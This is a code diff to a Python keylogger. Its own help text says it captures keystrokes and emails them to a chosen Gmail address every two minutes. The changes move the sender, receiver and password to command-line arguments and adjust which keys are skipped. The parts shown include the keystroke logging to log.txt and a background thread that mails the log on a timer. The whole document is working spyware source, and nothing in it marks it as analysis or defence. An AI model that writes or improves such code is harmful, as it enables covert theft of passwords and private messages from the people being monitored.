@@ -7,13 +7,26 @@ from email.mime.base import MIMEBase
 from email import encoders
 import threading
 import os
-#import sys
-#import subprocess
+import argparse
+
+parser = argparse.ArgumentParser(description="Capture keystrokes and send them to desired Gmail every 2 minutes")
+
+parser.add_argument("--sender","-s", required=True, help="Sender email address")
+parser.add_argument("--receiver", "-r", required=True, help="Receiver email address")
+parser.add_argument("--password", "-p", required=True, help="Email account password")
+
+args = parser.parse_args()
+
+sender_email = args.sender
+receiver_email = args.receiver
+password = args.password
+
 def create_log_file():
     with open("log.txt", "w"):
         pass
 
-#Check if log.txt file exists, if not, create it
+#Check if log.txt file exists, if not, create it   
+
 if not os.path.exists("log.txt"):
     create_log_file()
     
@@ -38,7 +51,7 @@ def writefile(key):
                 f.write('\n')
             elif key == Key.shift:
                 pass
-            elif key == Key.ctrl_l or key == Key.alt_r or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.esc or key == Key.backspace:
+            elif key == Key.cmd or key == Key.ctrl_l or key == Key.alt_l or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.esc or key == Key.backspace:
                 pass
             else:
                 f.write(str(key))
@@ -52,12 +65,6 @@ def send_email_thread():
         send_email()
         time.sleep(120)
     
-sender_email = input("Enter sender email: ")
-
-receiver_email = input("Enter receiver email: ")
-
-password = input("Enter password: ")
-
 def send_email():
 
     subject = "Email with Attachment"
